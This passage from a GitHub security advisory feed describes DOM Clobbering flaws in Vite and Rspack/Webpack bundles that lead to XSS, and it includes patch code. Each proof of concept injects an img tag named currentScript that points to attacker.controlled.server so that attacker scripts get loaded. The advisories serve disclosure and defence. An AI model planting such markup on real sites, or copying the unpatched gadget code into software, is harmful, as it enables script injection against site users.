<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@rspack/core] DOM Clobbering Gadget found in Rspack's AutoPublicPathRuntimeModule that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-84jw-g43v-8gjm</id>
        <link href="https://github.com/advisories/GHSA-84jw-g43v-8gjm"/>
        <updated>2024-09-19T17:30:06.000Z</updated>
        <content type="html"><![CDATA[<p>Hi, Rspack|Webpack developer team!</p>
<h2 id="summary">Summary</h2>
<p>We discovered a DOM Clobbering vulnerability in Webpacks AutoPublicPathRuntimeModule. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpacks code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.</p>
<h2 id="details">Details</h2>
<h3 id="backgrounds">Backgrounds</h3>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">research.securitum.com/xss-in-amp4email-dom-clobbering</a></p>
<h3 id="gadgets-found-in-webpack--rspack">Gadgets found in Webpack | Rspack</h3>
<p>We identified a DOM Clobbering vulnerability in Webpacks AutoPublicPathRuntimeModule. When the output.publicPath field in the configuration is not set or is set to auto, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:</p>
<pre><code class="language-js">/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() =&gt; {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl &amp;&amp; document) {
/******/ 			if (document.currentScript)
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i &gt; -1 &amp;&amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
</code></pre>
<p>However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with document.currentScript can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the src attribute of the attacker-controlled element will be used as the scriptUrl and assigned to <strong>webpack_require</strong>.p. If additional scripts are loaded from the server, <strong>webpack_require</strong>.p will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.</p>
<h2 id="poc">PoC</h2>
<p>Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, Im providing a demo to illustrate the concept.</p>
<p>Consider a website developer with the following two scripts, entry.js and import1.js, that are compiled using Webpack:</p>
<pre><code class="language-js">// entry.js
import('./import1.js')
  .then(module =&gt; {
    module.hello();
  })
  .catch(err =&gt; {
    console.error('Failed to load module', err);
  });
</code></pre>
<pre><code class="language-js">// import1.js
export function hello () {
  console.log('Hello');
}
The webpack.config.js is set up as follows:

const path = require('path');

module.exports = {
  entry: './entry.js', // Ensure the correct path to your entry file
  output: {
    filename: 'webpack-gadgets.bundle.js', // Output bundle file
    path: path.resolve(__dirname, 'dist'), // Output directory
    publicPath: "auto", // Or leave this field not set
  },
  target: 'web',
  mode: 'development',
};
</code></pre>
<p>When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the import1.js file from the attacker's domain, attacker.controlled.server. The attacker only needs to insert an img tag with the name attribute set to currentScript. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Webpack Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script src="./dist/webpack-gadgets.bundle.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="impact">Impact</h2>
<p>This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.</p>
<h2 id="patch">Patch</h2>
<p>A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: <a href="https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174">google/closure-library@b312823/closure/goog/base.js#L174</a></p>
<pre><code class="language-js">/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() =&gt; {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl &amp;&amp; document) {
/******/ 			if (document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :&gt;
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i &gt; -1 &amp;&amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
</code></pre>
<p>Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/web-infra-dev/rspack/security/advisories/GHSA-84jw-g43v-8gjm">https://github.com/web-infra-dev/rspack/security/advisories/GHSA-84jw-g43v-8gjm</a></li>
<li><a href="https://github.com/web-infra-dev/rspack/commit/0303c68bd76da258c9fd483936d3a00b9761aad0">https://github.com/web-infra-dev/rspack/commit/0303c68bd76da258c9fd483936d3a00b9761aad0</a></li>
<li><a href="https://github.com/advisories/GHSA-84jw-g43v-8gjm">https://github.com/advisories/GHSA-84jw-g43v-8gjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-84jw-g43v-8gjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-19T17:30:05.000Z</published>
    </entry>
</feed>